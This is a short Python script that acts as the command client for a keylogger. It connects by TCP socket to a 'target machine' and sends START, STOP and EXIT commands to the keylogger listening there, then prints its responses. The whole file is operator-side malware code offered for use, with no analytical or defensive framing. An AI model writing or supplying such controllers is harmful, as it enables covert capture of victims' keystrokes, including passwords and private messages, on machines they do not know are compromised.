import socket

# Configure the target machine's IP address and port
TARGET_IP = '192.168.0.23'  # Replace with the actual IP address of the target machine
TARGET_PORT = 12345  # Replace with the port on which the keylogger is listening

# Connect to the target machine
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((TARGET_IP, TARGET_PORT))

# Send commands to the keylogger
while True:
    command = input("Enter a command (e.g., START, STOP, EXIT): ")
    client_socket.send(command.encode())

    # Receive and process the response from the keylogger
    response = client_socket.recv(1024).decode()
    print(f"Response: {response}")

    if command.upper() == 'EXIT':
        break

# Close the connection
client_socket.close()
